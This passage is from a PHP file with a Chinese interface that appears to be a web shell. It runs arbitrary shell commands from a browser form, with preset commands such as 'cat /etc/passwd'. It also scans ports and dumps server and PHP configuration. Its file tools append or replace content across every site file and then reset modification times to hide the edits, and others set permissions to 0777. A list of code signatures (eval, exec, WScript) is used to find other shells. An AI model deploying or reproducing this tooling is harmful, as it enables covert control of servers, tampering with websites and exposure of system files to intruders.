        <option value="ls -alF ~/ 2>&1">列出目录：ls -alF ~/ 2>&1</option>
        <option value="ps aux | grep php-fpm">查看进程：ps aux | grep php-fpm</option>
        <option value="top -bn 1">性能监控：top -bn 1</option>
        <option value="netstat -tunpl 2>&1">查看端口：netstat -tunpl 2>&1</option>
        <option value="ip a; echo \'\n\'; hostname -I;">查看ip：ip a; echo \'\n\'; hostname -I;</option>
        <option value="cat /etc/passwd">查看用户：cat /etc/passwd</option>
        <option value="cat /etc/hosts">查看hosts：cat /etc/hosts</option>
        <option value="php --ini">php配置文件：php --ini</option>
        <option value="/root/backup.sh 2>&1">返回结果：/root/backup.sh 2>&1</option>
        <option value="/root/backup.sh > ./run.log">输出日志：/root/backup.sh > ./run.log</option>
        <option value="tail -30 ./run.log 2>&1">查看后30行：tail -30 ./run.log 2>&1</option>
    </select>';
        }

        $fun = select('fun', ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'mail',], $fun);

        $html = '执行shell命令<br><br><form method="get">
            <input type="hidden" name="a" value="shell">
            <input type="hidden" name="repeat" value="0">
            使用函数：' . $fun . '
            <br><br>执行命令：<textarea name="cmd" style="width:90%;height:50px;">' . $cmd . '</textarea>
            <br>快速输入：' . $select . '
            <br><br> 提交执行：<button type="button" onclick="submitRun(this.form)" style="width:200px;"> 运 行 </button> &nbsp; <button type="button" onclick="var v=prompt(\'输入秒数，每隔n秒运行一次\', ' . (empty($repeat) ? 5 : $repeat) . '); if(v){this.form.repeat.value=v; submitRun(this.form)}">重复运行</button> &nbsp; <button type="button" onclick="noRepeat()"> 停止重复运行 </button></form><br><br>当前时间：<span style="color:#f60;">' . date('Y-m-d H:i:s') . '</span>' . ($repeat > 0 ? (' <span style="color:#00f;">刷新周期：' . $repeat . ' 秒</span> <span id="reStatus" style="color:#f00;display:none;">(已停止)</span>') : '') . '<br><br>执行结果：<textarea id="output" style="width:90%;height:300px;background: #000;color: #0c0;">' . ($ret) . '</textarea><script>
    document.getElementById("output").scrollTop = document.getElementById("output").scrollHeight;
    function submitRun(form) {
        form.cmd.value = base64encode(form.cmd.value);
        form.submit();
    }
    function base64encode(string) {
        var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var str, i, len, c1, c2, c3;
        len = string.length;
        i = 0;
        str = "";
        while (i < len) {
            c1 = string.charCodeAt(i++) & 0xff;
            if (i == len) {
                str += base64EncodeChars.charAt(c1 >> 2);
                str += base64EncodeChars.charAt((c1 & 0x3) << 4);
                str += "==";
                break;
            }
            c2 = string.charCodeAt(i++);
            if (i == len) {
                str += base64EncodeChars.charAt(c1 >> 2);
                str += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
                str += base64EncodeChars.charAt((c2 & 0xF) << 2);
                str += "=";
                break;
            }
            c3 = string.charCodeAt(i++);
            str += base64EncodeChars.charAt(c1 >> 2);
            str += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
            str += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
            str += base64EncodeChars.charAt(c3 & 0x3F);
        }
        return str;
    }
</script>';

        if ($repeat > 0) {
            $html .= '<script>
            var timeId;
            timeId=setTimeout(function(){window.location=window.location.href}, ' . ($repeat * 1000) . ');
            function noRepeat() {window.clearTimeout(timeId);document.getElementById("reStatus").style.display="inline"}
            </script>';
        }

        self::display($html);
    }

    public static function portAction()
    {
        if ($_POST) {
            $ip = p('ip');
            $port = p('port');

            $html = '<br><br>扫描IP：' . $ip . '<br><br>';
            if (stripos($port, '-') !== false) {
                $ports = explode('-', $port);
                for ($i = $ports[0]; $i <= $ports[1]; $i++) {
                    $fp = @fsockopen($ip, $i, $errno, $errstr, 1);
                    $html .= $fp ? "<span style=\"color:#f30;\">{$i}✓</span>, " : $i . '✗, ';
                }
            } else {
                $port = str_replace([' ', ',', '，', '|',], '|', $port);
                $ports = explode('|', $port);
                for ($i = 0; $i < count($ports); $i++) {
                    if (empty($ports[$i])) continue;
                    $fp = @fsockopen($ip, $ports[$i], $errno, $errstr, 1);
                    $html .= $fp ? "<span style=\"color:#f30;\">{$ports[$i]}✓</span>, " : $ports[$i] . '✗, ';
                }
            }
            self::display(btn() . $html);
        }
        self::display('扫描端口<br><br><form method="post"> 扫 描 I P ：<input name="ip" value="127.0.0.1"/> <br><br>端口范围：<input name="port" value="21|23|25|80|110|135|139|143|443|445|873|1433|2049|2121|3306|3389|5631|6379|8080|43958|65301" style="width:90%"/>
<br>指定多个：分隔符用|或,或空格
<br>指定范围：1-1024 8000-8999
<br><br> <button type="submit">开始扫描</button></form>');
    }

    public static function phpinfoAction()
    {
        phpinfo();
    }

    public static function infoAction()
    {
        function _exists($name)
        {
            return ((function_exists($name) || class_exists($name)) ? '<span style="color:#090;">✓</span>' : '<span style="color:#f30;">✗</span>') . ' <span style="color:#00f;">' . $name . '()</span>';
        }

        function _select($val)
        {
            return '<span style="color:#06f;">' . $val . '</span> = <span style="color:#f00;">' . get_cfg_var($val) . '</span>';
        }

        $testInfo = self::_testInfo();
        $sysInfo = self::_sysInfo();

        //环境信息
        $data = [
            ['项' => '服务器时间', '值' => date('Y-m-d H:i:s'),],
            ['你的IP', $_SERVER['REMOTE_ADDR'],],
            ['服务器IP', (isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])),],
            ['域名', $_SERVER['SERVER_NAME'] . ':' . $_SERVER['SERVER_PORT'],],
            ['', '',],
            ['网络(限linux)', $sysInfo['Net'],],
            ['内存(需要权限)', "<div style=\"width:300px;background:#fdc;\"><div style=\"background:#f60;height:5px;width:{$sysInfo['MemPercent']}%;\"></div></div>
                        <span style=\"color:#f60\">已用{$sysInfo['MemUse']}Gb({$sysInfo['MemPercent']}%) ， 总计{$sysInfo['MemTotal']}Gb</span>  <button type=\"button\" onclick=\"window.location=window.location.href\">刷新</button>",],
            ['真实内存', "<div style=\"width:300px;background:#dfd;\"><div style=\"background:#0c0;height:5px;width:{$sysInfo['MemRealPercent']}%;\"></div></div>
                        <span style=\"color:#0c0\">真实{$sysInfo['MemRealUse']}Gb({$sysInfo['MemRealPercent']}%) + 缓存{$sysInfo['MemCached']}Gb + 缓冲{$sysInfo['MemBuffers']}Gb + 空闲{$sysInfo['MemFree']}Gb = 总计{$sysInfo['MemTotal']}Gb</span>",],
            ['交换区', "<div style=\"width:300px;background:#fdf;\"><div style=\"background:#e0f;height:5px;width:{$sysInfo['SwapPercent']}%;\"></div></div>
                        <span style=\"color:#e0f\">已用{$sysInfo['SwapUse']}Gb({$sysInfo['SwapPercent']}%) ， 总计{$sysInfo['SwapTotal']}Gb</span>",],
            ['硬盘空间', "<div style=\"width:300px;background:#ccf;\"><div style=\"background:#07f;height:5px;width:{$sysInfo['DiskUsePercent']}%;\"></div></div>
                        <span style=\"color:#07f\">已用{$sysInfo['DiskUse']}Gb({$sysInfo['DiskUsePercent']}%) ， 总计{$sysInfo['DiskTotal']}Gb</span>",],
            ['整数运算测试', $testInfo['int'] . ' (1+1运算300万次) 大于0.1秒为慢(下同)',],
            ['浮点运算测试', $testInfo['float'] . ' (圆周率开平方300万次)',],
            ['IO读取测试', $testInfo['io'] . ' (读取1k文件3万次)',],
            ['', '',],
            ['操作系统', php_uname(),],
            ['语言', $_SERVER['HTTP_ACCEPT_LANGUAGE'],],
            ['解译引擎', $_SERVER['SERVER_SOFTWARE'],],
            ['运行用户', get_current_user(),],
            ['运行方式', strtoupper(php_sapi_name()) . ' 进程ID:' . getmypid(),],
            ['运行安全模式', _select('safemode'),],
            ['报告内存泄漏', _select('report_memleaks'),],
            //PHP
            ['', '',],
            ['PHP版本', PHP_VERSION,],
            ['显示错误信息', _select('display_errors'),],
            ['错误报告', _select('error_reporting'),],
            ['记录错误', _select('log_errors'),],
            ['插件目录', _select('extension_dir'),],
            ['时区', ini_get('date.timezone'),],
            ['', '',],
            ['脚本最大内存', _select('memory_limit'),],
            ['脚本超时时间', _select('max_execution_time') . ' 秒',],
            ['', '',],
            ['POST限制', _select('post_max_size'),],
            ['请求超时时间', _select('max_input_time') . ' 秒',],
            ['请求最大数量', _select('max_input_vars') . '（默认1000个）',],
            ['允许上传', _select('file_uploads'),],
            ['上传限制大小', _select('upload_max_filesize'),],
            ['上传最大数量', _select('max_file_uploads') . ' 个',],
            ['', '',],
            ['打开远程文件', _select('allow_url_fopen'),],
            ['Socket超时', _select('default_socket_timeout') . ' 秒',],
            ['', '',],
            ['&lt;?...?&gt;短标签', _select('short_open_tag'),],
            ['转义请求数据', _select('magic_quotes_gpc'),],
            ['转义数据库', _select('magic_quotes_runtime'),],
            ['被禁用的函数', _select('disable_functions'),],
            ['定义全局变量', _select('register_globals'),],
            ['argc变量声明', _select('register_argc_argv'),],
            ['浮点有效位数', _select('precision'),],
            ['允许动态库', _select('enable_dl'),],
            ['SMTP', _select('SMTP'),],
            // 数据库
            ['', '',],
            ['Redis缓存数据库', _exists('Redis'),],
            ['PDO数据库', _exists('PDO'),],
            ['MySQL数据库', _exists('mysql_close'),],
            ['PostgreSQL库', _exists('pg_close'),],
            ['SQLServer库', _exists('mssql_close'),],
            ['ODBC数据库', _exists('odbc_close'),],
            ['SyBase数据库', _exists('sybase_close'),],
            ['Oracle8数据库', _exists('OCILogOff'),],
            ['Oracle数据库', _exists('ora_close'),],
            // 插件支持
            ['', '',],
            ['Curl', _exists('curl_init'),],
            ['FTP', _exists('ftp_login'),],
            ['Socket', _exists('fsockopen'),],
            ['Zlib压缩', _exists('gzclose'),],
            ['mbString函数', _exists('mb_eregi'),],
            ['GD图形处理', _exists('imageline'),],
            ['Pcre语法', _exists('preg_match'),],
            ['历法运算库', _exists('JDToGregorian'),],
            ['Mhash哈稀计算', _exists('mhash_count'),],
            ['BCMath运算', _exists('bcadd'),],
            ['XML解析', _exists('xml_set_object'),],
            ['WDDX', _exists('wddx_add_vars'),],
            ['LDAP协议', _exists('ldap_close'),],
            ['ASpell拼写检查', _exists('aspell_check_raw'),],
            ['MCrypt加密', _exists('mcrypt_cbc'),],
            ['SNMP协议', _exists('snmpget'),],
            ['IMAP邮件', _exists('imap_close'),],
            ['VMailMgr邮件', _exists('vm_adduser'),],
            ['PDF文档', _exists('pdf_close'),],
        ];
        $html = Tool::table('函数模块', $data);
        self::display($html);

    }

    private static function _testInfo()
    {
        // 用时
        function _sec($start)
        {
            $end = gettimeofday();
            $time = round(($end['usec'] - $start['usec']) / 1000000 + $end['sec'] - $start['sec'], 3);
            return $time . '秒';
        }

        //整数运算测试
        $start = gettimeofday();
        for ($i = 0; $i < 3000000; $i++) {
            $t = 1 + 1;
        }
        $testInfo['int'] = _sec($start);

        //浮点运算测试
        $start = gettimeofday();
        $pi = pi();
        for ($i = 0; $i < 3000000; $i++) {
            sqrt($pi);
        }
        $testInfo['float'] = _sec($start);

        //IO读取测试
        $start = gettimeofday();
        $fp = @fopen(SELF, 'r');
        for ($i = 0; $i < 30000; $i++) {
            @fread($fp, 1024); //读1k
            @rewind($fp);
        }
        @fclose($fp);
        $testInfo['io'] = _sec($start);

        return $testInfo;
    }

    // linux系统
    private static function _sysInfo()
    {
        // Kb转Gb
        function _k2g($kb)
        {
            if (empty($kb)) return 0;
            return round($kb / (1024 * 1024), 3);
        }

        $sysInfo['DiskTotal'] = round(disk_total_space('.') / (1024 * 1024 * 1024), 3);
        $sysInfo['DiskUse'] = round((disk_total_space('.') - disk_free_space('.')) / (1024 * 1024 * 1024), 3);
        $sysInfo['DiskUsePercent'] = round($sysInfo['DiskUse'] / $sysInfo['DiskTotal'] * 100, 2); // %

        $men = ['MemTotal' => 0, 'MemFree' => 0, 'Cached' => 0, 'Buffers' => 0, 'SwapTotal' => 0, 'SwapFree' => 0,];
        preg_match_all("/([^:]+)\:\s*(\d+)\s\w+?\n/", @implode((array)@file('/proc/meminfo')), $match);
        if (is_array($match[1])) foreach ($match[1] as $i => $arr) {
            $men[$arr] = $match[2][$i];
        }
        $sysInfo['MemTotal'] = _k2g($men['MemTotal']);
        $sysInfo['MemUse'] = _k2g($men['MemTotal'] - $men['MemFree']);
        $sysInfo['MemFree'] = _k2g($men['MemFree']);
        $sysInfo['MemPercent'] = $men['MemTotal'] > 0 ? round(($men['MemTotal'] - $men['MemFree']) / $men['MemTotal'] * 100, 2) : 0; // %

        $sysInfo['MemCached'] = _k2g($men['Cached']); // Cached内存
        $sysInfo['MemBuffers'] = _k2g($men['Buffers']); // 缓冲内存
        $sysInfo['MemRealUse'] = _k2g($men['MemTotal'] - $men['MemFree'] - $men['Cached'] - $men['Buffers']); // 真实使用内存
        $sysInfo['MemRealPercent'] = $men['MemTotal'] > 0 ? round($sysInfo['MemRealUse'] / ($men['MemTotal'] / (1024 * 1024)) * 100, 2) : 0; // % // 真实使用内存

        $sysInfo['SwapTotal'] = _k2g($men['SwapTotal']); // 交换区内存
        $sysInfo['SwapUse'] = _k2g($men['SwapTotal'] - $men['SwapFree']);
        $sysInfo['SwapPercent'] = $men['SwapTotal'] > 0 ? round(($men['SwapTotal'] - $men['SwapFree']) / $men['SwapTotal'] * 100, 2) : 0;

        $js = "<script src=\"http://code.jquery.com/jquery-1.7.2.min.js\"></script>
    <script>
         // 更新网速
        (function () {
            var sec = 2; // 秒，异步n秒周期刷新

            setInterval(function () {
                $.post('?a=net', {}, function (list) {
                    $.each(list, function (key, rs) {
                        var i = $('#in' + key);
                        var o = $('#out' + key);
                        var preIn = i.attr('packets');
                        var preOut = o.attr('packets');

                        var curIn = rs.inPackets;
                        var curOut = rs.outPackets;
                        i.attr('packets', curIn);
                        o.attr('packets', curOut);

                        i.html(format(curIn - preIn));
                        o.html(format(curOut - preOut));
                    });
                }, 'json');
            }, sec * 1000);

            function format(int) {
                int = int / sec;
                if (int < 0) {
                    return 0 + ' K/s';
                } if (int < 1048576) {
                    int = int / 1024;
                    return int.toFixed(3) + ' K/s';
                } else {
                    int = int / 1048576;
                    return int.toFixed(3) + ' M/s';
                }
            }
        })();
    </script>";
        $net = [];
        foreach (self::_net() as $i => $rs) {
            $net[] = "出网：<span id=\"out{$i}\" packets=\"{$rs['outPackets']}\" style=\"color:#f60;\">0 K/s</span>，入网：<span id=\"in{$i}\" packets=\"{$rs['inPackets']}\" style=\"color:#f60;\">0 K/s</span>，接口：{$rs['Interface']}";
        }
        $sysInfo['Net'] = $net ? (implode('<br>', $net) . $js) : '';

        return $sysInfo;
    }

    // 网络接口发送或接收的数据包，周期读取一次可计算网速
    private static function _net()
    {
        $net = [];
        preg_match_all("/\n\s*([^:]+)\s*\:\s*(\d{2,})\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+.+\n*/", @implode((array)@file('/proc/net/dev')), $match);
        if (is_array($match[1])) foreach ($match[1] as $i => $arr) {
            $net[] = ['Interface' => $match[1][$i], 'inPackets' => $match[3][$i], 'outPackets' => $match[10][$i],];
        }
        return $net;
    }

    public static function netAction()
    {
        header('Content-type: application/json;charset=utf-8');
        echo json_encode(self::_net());
    }
}

class Tool
{
    // php|asp|aspx|jsp|html|htm|jpg|gif|png
    public static function searchContent($dir, $child = false, $ext = ['php', 'html',])
    {
        $features = [
            'php'  => ['eval(', 'exec(',],
            'asp'  => ['eval', 'WScript', 'CreateTextFile', 'Execute(', 'clsid:',],
            'aspx' => ['eval(', 'RunCMD(', 'CreateText',],
            'jsp'  => ['runtime.exec'],
            'html' => ['frame>'],
            'htm'  => ['frame>'],
            'gif'  => ['<?php', '<script', 'eval(', 'error', 'base64', 'Server', 'exec',],
            'jpg'  => ['<?php', '<script', 'eval(', 'error', 'base64', 'Server', 'exec',],
            'png'  => ['<?php', '<script', 'eval(', 'error', 'base64', 'Server', 'exec',],
        ];

        $i = 0;
        $array = [];
        $list = Tool::getFiles($dir, $child, $ext);
        foreach ($list as $file) {
            if ($file == SELF) continue;
            $i++;
            $_ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if (!isset($features[$_ext])) continue;
            $content = file_get_contents($file);
            foreach ($features[$_ext] as $feature) {
                if (stripos($content, $feature) !== false) {
                    $array[] = [
                        '序号'   => $i,
                        '扫描时间' => date('H:i:s'),
                        '文件'   => $file,
                        '可疑代码' => htmlspecialchars($feature),
                    ];
                }
            }
        }
        return $array;
    }

    public static function addContent($dir, $content, $child = false, $ext = ['php', 'html', 'js', 'css', 'xml',])
    {
        if (empty($content)) return [];
        $array = [];
        $list = self::getFiles($dir, $child, $ext);
        foreach ($list as $file) {
            if ($file == SELF) continue;
            $time = @filemtime($file);
            file_put_contents($file, file_get_contents($file) . $content) && ($array[] = $file);
            @touch($file, $time, $time);
        }
        return $array;
    }

    public static function replaceContent($dir, $oldTxt, $newTxt, $child = false, $ext = ['php', 'html', 'js', 'css', 'xml',])
    {
        if (empty($oldTxt) || $oldTxt == $newTxt) return [];
        $array = [];
        $list = self::getFiles($dir, $child, $ext);
        foreach ($list as $file) {
            if ($file == SELF) continue;
            $content = file_get_contents($file);
            if (stripos($content, $oldTxt) !== false) {
                $time = @filemtime($file);
                file_put_contents($file, str_ireplace($oldTxt, $newTxt, $content)) && ($array[] = $file);
                @touch($file, $time, $time);
            }
        }
        return $array;
    }

    public static function searchFiles($dir, $keyword, $type, $_list = [])
    {
        $dir = self::formatPath($dir);
        $files = glob($dir . '{,.}*', GLOB_BRACE);
        if ($files) foreach ($files as $f) {
            if (substr($f, -1, 1) == '.') continue;
            if ($f == SELF) continue;
            if (is_dir($f)) {
                $_list = self::searchFiles($f, $keyword, $type, $_list);
            }
            if ($type == '搜文件名') {
                if (stripos(basename($f), $keyword) !== false) $_list[] = $f;
            } else if ($type == '搜文件内容') {
                if (stripos(file_get_contents($f), $keyword) !== false) $_list[] = $f;
            }
        }
        return $_list;
    }

    public static function formatPath($path)
    {
        $path = str_replace('\\', '/', $path);
        if (substr($path, -1) != '/') $path = $path . '/';
        return $path;
    }

    public static function createDir($dir)
    {
        if (is_dir($dir)) return true;
        $dir = self::formatPath($dir);
        $temp = explode('/', $dir);
        $curDir = '';
        $max = count($temp) - 1;
        for ($i = 0; $i < $max; $i++) {
            $curDir .= $temp[$i] . '/';
            if (is_dir($curDir) || is_file($curDir)) continue;
            $ret = @mkdir($curDir, 0777, true);
            if ($ret) chmod($curDir, 0777);
        }
        return is_dir($dir);
    }

    public static function getDirAndFile($dir)
    {
        $dir = self::formatPath($dir);
        $files = glob($dir . '{,.}*', GLOB_BRACE);
        if (!is_array($files)) return [];
        $arr = $file = [];
        foreach ($files as $f) {
            if (substr($f, -1, 1) == '.') continue;
            if (is_dir($f)) {
                $arr[] = $f;
            } else {
                $file[] = $f;
            }
        }
        asort($arr, SORT_NATURAL);
        asort($file, SORT_NATURAL);
        return array_merge($arr, $file);
    }

    public static function getFiles($dir, $child = false, $ext = [], $_list = [])
    {
        $dir = self::formatPath($dir);
        $files = glob($dir . '{,.}*', GLOB_BRACE);
        if ($files) foreach ($files as $f) {
            if (substr($f, -1, 1) == '.') continue;
            if ($child && is_dir($f)) {
                $_list = self::getFiles($f, $child, $ext, $_list);
            } else if (!$ext || in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), $ext)) {
                $_list[] = $f;
            }
        }
        return $_list;
    }

    public static function copyDir($fromDir, $toDir)
    {
        $fromDir = self::formatPath($fromDir);
        if (!is_dir($fromDir)) return 0;
        $toDir = self::formatPath($toDir);
        self::createDir($toDir);

        $i = 0;
        $list = glob($fromDir . '{,.}*', GLOB_BRACE);
        if ($list) foreach ($list as $f) {
            if (substr($f, -1, 1) == '.') continue;
            $t = $toDir . basename($f);
            if ($f == $t) continue;
            if (is_dir($f)) {
                $i += self::copyDir($f, $t);
            } else {
                copy($f, $t) && $i++;
                chmod($t, 0777);
            }
        }
        return $i;
    }

    public static function deleteDir($dir)
    {
        $dir = self::formatPath($dir);
        if (!is_dir($dir)) return false;
        $list = glob($dir . '{,.}*', GLOB_BRACE);
        if ($list) foreach ($list as $f) {
            if (substr($f, -1, 1) == '.') continue;
            is_dir($f) ? self::deleteDir($f) : @unlink($f);
        }
        return rmdir($dir);
    }

    public static function setFileTime($path, $mTime)
    {
        $i = 0;
        if (is_dir($path)) {
            $path = self::formatPath($path);
            $files = glob($path . '{,.}*', GLOB_BRACE);
            if ($files) foreach ($files as $f) {
                if (substr($f, -1, 1) == '.') continue;
                $i += self::setFileTime($f, $mTime);
            }
        }
        touch($path, $mTime, $mTime) && $i++;
        return $i;
    }

    public static function setFilePerms($path, $mode = 0777)
    {
        $i = 0;
        if (is_dir($path)) {
            $path = self::formatPath($path);
            $files = glob($path . '{,.}*', GLOB_BRACE);
            if ($files) foreach ($files as $f) {
                if (substr($f, -1, 1) == '.') continue;
                $i += self::setFilePerms($f, $mode);
            }
        }
        chmod($path, $mode) && $i++;
        return $i;
    }

    public static function formatSize($size)
    {
        $unit = ['B', 'KB', 'MB', 'GB', 'TB', 'PB',];
        return @round($size / pow(1024, ($i = intval(log($size, 1024)))), 2) . ' ' . $unit[$i];
    }

    public static function convertEncoding($str, $inCharset = null, $outCharset = 'utf-8')
    {
        if (is_array($str)) {
            foreach ($str as $key => $val) {
                $str[$key] = self::convertEncoding($val, $inCharset, $outCharset);
            }
            return $str;
        } else {
            if (function_exists('mb_convert_encoding')) {
                return @mb_convert_encoding($str, $outCharset, $inCharset);
            } else if (function_exists('iconv')) {
                return @iconv($inCharset, $outCharset, $str);
            } else {
                return $str;
            }
        }
    }

    public static function getEncode($str)
    {
        if (function_exists('mb_detect_encoding')) {
            return strtolower(mb_detect_encoding($str, ['UTF-8', 'GB2312', 'EUC-CN', 'ASCII', 'GBK', 'BIG5']));
        } else {
            $coding = ['utf-8', 'gb2312', 'gbk', 'big5', 'ascii'];
            foreach ($coding as $c) {
                if ($str === iconv('utf-8', $c, @iconv($c, 'utf-8', $str))) return $c;
            }
        }
        return '';
    }

    public static function table($title, $list, $preLabel = false)
    {
        $str = "\n<strong>{$title}</strong>";
        // 二维数组
        if (is_array($list) && is_array(current($list))) {
            $str .= "<table border='0' cellpadding='0' cellspacing='0'><tr bgcolor='#f6f6f6'>";
            foreach (current($list) as $field => $v) { // 表头
                $str .= "<td>{$field}</td>";
            }
            $str .= "</tr>";
            foreach ($list as $rs) {
                $str .= "\n<tr>";
                if ($rs) foreach ($rs as $v) {
                    $v = $v == null ? '&nbsp;' : (is_array($v) ? '<pre>' . var_export($v, true) . '</pre>' : (is_object($v) ? get_class($v) . '{}' : $v));
                    $str .= !$preLabel ? "<td>{$v}</td>" : "<td><pre>{$v}</pre></td>";
                }
                $str .= "</tr>";
            }
            $str .= "</table>";
        } else if (is_array($list)) { // 一维数组
            $str .= "<table border='0' cellpadding='0' cellspacing='0'><tr bgcolor='#f6f6f6'>";
            foreach ($list as $field => $v) {
                $str .= "<td>{$field}</td>";
            }
            $str .= "</tr>\n<tr>";
            foreach ($list as $v) {
                $v = $v == null ? '&nbsp;' : (is_array($v) ? '<pre>' . var_export($v, true) . '</pre>' : (is_object($v) ? get_class($v) . '{}' : $v));
                $str .= !$preLabel ? "<td>{$v}</td>" : "<td><pre>{$v}</pre></td>";
            }
            $str .= "</tr></table>";
        }
        return $str;
    }

    public static function table2($data)
    {
        if (is_array($data)) {
            if (empty($data)) return '';
            $str = "<table border='0' cellpadding='0' cellspacing='0'>";
            foreach ($data as $key => $val) {
                $val = is_object($val) ? (get_class($val) . '{}') : self::table2($val);
                $str .= "\n <tr><td>{$key}</td><td>{$val}</td></tr>";
            }
            $str .= "</table>";
            return $str;
        } else {
            return $data;
        }
    }

    public static function ico($file)
    {
        $data = [
            'dir'                                                         => 'R0lGODlhFAAUALMAAOSsFe7HNPnidv7+/Nm4V7V9FvDRTLCLIeq9Is6PAs/KyfLomfPq0rWPSfTaY9efEiH5BAAAAAAALAAAAAAUABQAQASPcMhJa13BuM17N8gyNAlgniiaEBJBLHAsy+7APEig7zyPPAwJw+EqGl2a4GCh8Tg/jAUgY6har9YAYHEDIL7gcPgBnCjO6HTawm5PFoXCoUGv1w+HeJAhWAj+gA6Ag39RAU+IDgEwCFiOWCELDz2UPg9cD145YptgAGUPJSmjJgkPEgoHCausra0NCm6yEhEAOw==',
            'file'                                                        => 'R0lGODlhFAAUALMAAPr6+qenp62trcHBwfDw8NjY2IeHh7Ozs8nJyeTk5JiYmPz8/Orq6rq6uqKiov///yH5BAAAAAAALAAAAAAUABQAQAST8MlJq03urc33S8KBBBOmddx3CAZCFYaAzDRNBGOZAXzPLyARqZIwMI5IJKGg0FkojFBOYlr4eh/p8JNBpYJT7nNCMAwAT0DAEWi73YpBZWAwOO74u8JQ2DLMA4GCggFaTgMNiYoNCWBbJoiLDQeNhlQZkYuUjoeSiZVCnZKbAiEZlw+ZipQMewwUZaWyswIKBxURADs=',
            '|php|asp|jsp|'                                               => 'R0lGODlhFAAUAKIAAP///8zM/8zMzJmZzGaZzGZmzGZmmQAAACH5BAAAAAAALAAAAAAUABQAAAN7CLog80OwuQYxOJNBVRhGIY6iMQRTUIRZyxZoFRZQPZScIsxFB3yr3G3ka4QIRtLik1MQVg5ez4ORKG4mkLJiVeC0RJ82K+18Zqbd9rfBjgySZ/iHIYmQAPCUbg/KREtSK3geKzQQdiExSyAtJAYEixMWLpBNRQ4QXQwJADs=',
            '|html|htm|shtml|xml|'                                        => 'R0lGODlhFAAUALMAAIqitdnc3f7+/QAqVz9gdoaKjwBDjVKQs/ryyOG4LfDVfFvN9LXEzM7PdS+i1w6AwSH5BAAAAAAALAAAAAAUABQAQAS0UMhJq0CIltFUIkAgBsdjGsTlSQzxOEvsPEZhSQEBMh7jA6BLBuEpGAwPAAVwaBJsN0HAF/BkJMQJYUDoJAoAoGNMC0wajUTiaGqfDIOBUD1Ajh1NMi2FTTQwCgpXUYQVRIEKfxYFYAxpDQAFZlgTOQQHXgVNmwQMFAFcmZVuA1ACjGkbSG4ncVhpH0cAPrS1nhhqBHZJIgBtcDZECQgAAy8xyDMokwIrEwyamyE3CGiChRMRADs=',
            '|js|'                                                        => 'R0lGODlhFAAUALMAAIujuJm0y6nI3PT29s9TS8vZ49idmOvNzPj4+OHm6vXk4+vv8s3p91yUvL3O2v///yH5BAAAAAAALAAAAAAUABQAQASc8MlJDxk0Z2WeIYiETUkDFNOSJEtaCNpEEMuXxJkQMDzzCoiFbhRDfA4cQwgnMXRmB+ajYHIUrg6BziFxAJYUAWNB5hE1iEQAwG67AYGW1BJVgHGKWeIolSAITwR9FAsECnkgUgkODiEhBlFBDgE3E2lZjIwFCUQCABpCOgGjAgUIVxoJBQMCDa6vXBpUJnCjtrekGgOqVwWaLBkRADs=',
            '|gif|jpg|jpeg|png|bmp|ico|'                                  => 'R0lGODlhFAAUALMAAOrx8VulRarb+JjPGsTl983M0ZnOp6HSaYK1KOLh5fL91dLonR6IJ////pTQ8////yH5BAAAAAAALAAAAAAUABQAQASY8LVJq7WAGKMD+cJnBAYAFM8yrGzrHudDOEJt37ZDxCqCrAiGEBgQBmKZj3LJ3BUaAJwBVyOEeANfYGs8HLgMGErlGgR+LERAnCi43/A4/EGvXyb1ByAhc/j/gIECJ1BUhlWESUocTYgoAAc/XyQkJSNFTilZP2pCDFlgR2NZLUWfQEZYZWgtCGISCrGys7RQBQm4ubq7uxEAOw==',
            '|mp3|wma|mid|mp4|mpg|mpeg|wmv|avi|swf|flv|'                  => 'R0lGODlhFAAUALMAABAdhT1DMzjAO32e3O/z/Kiqpjdpwu7VIXJwUdydj6S87sLQ9ILRiNvk+79RSv///yH5BAAAAAAALAAAAAAUABQAQAS+8ElJCgo4oEKmDI6jLE2jGKgxLsogCIGEAKnSEESzFMeBIJNCIJFY4HClBYsBKzwCtIFiZABER9NBDygbEokFhhjGfQgdiRISqcw2oarpomqtqwY8BCGAGihJSDoLWj4dQVB1PT4BTh6HCGgJYxeNHhdfNzk6YgwaFCBFR4FtLjB7ITY3LCNJbgIXqCsDdVYGA7cIMHBSVLQ0WQk+BTQqSresggp5TsN9gBQ6CluVDzMpKMGKP44TFRcZG4YTEQA7',
            '|doc|docx|xls|xlsx|ppt|pptx|pdf|'                            => 'R0lGODlhFAAUALMAAP///8zMzMzMmZnMmZnMZpmZmZmZZmaZZmaZM2aZADOZAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUABQAAASLEIhJq6UhJMW7/9ygIUZpnieiiIoBvHAcE2vQyjhMs26O7zbXAEEcvA5ExAt4CyA2CsKhQ1gqCrbDK2CgKRKbqhV72w68ZStLCyMSwIaBEUAjswFTBQKtpF+zRx5gYWqAAkmIHUZMdzIBcgMCfnY+PzUKjZUAAzUJCJCgZwSjoypYUCCpIY+hra0BEQA7',
            '|zip|rar|gz|tar|iso|7z|jar|rpm|mdf|z|bz2|xz|'                => 'R0lGODlhFAAUALMAAPn9/iO58Cl5nbtMKQ+X04BELNbu96CDdMzAtoLBYUaULWHR9OV7XmODizuov+br5CH5BAAAAAAALAAAAAAUABQAQASXEEhgan3P1kmJ/w4iIs73GY+irmpRsOxDBUtgB84wNPdtAA+dUOgaDmWzXqAwcCh/SWVDx1MGUIysFnFwHbRgTGJMTnQLhzJZhmljuAeEu82p9Q7N3oIDqNlxOk56E383UztWewYmHwIuDYweFQKUlQ4HmAcNlZVYYFlwX58MGEY6LkWmYmoJCi4KrAkYMC2otApIfLq7EQA7',
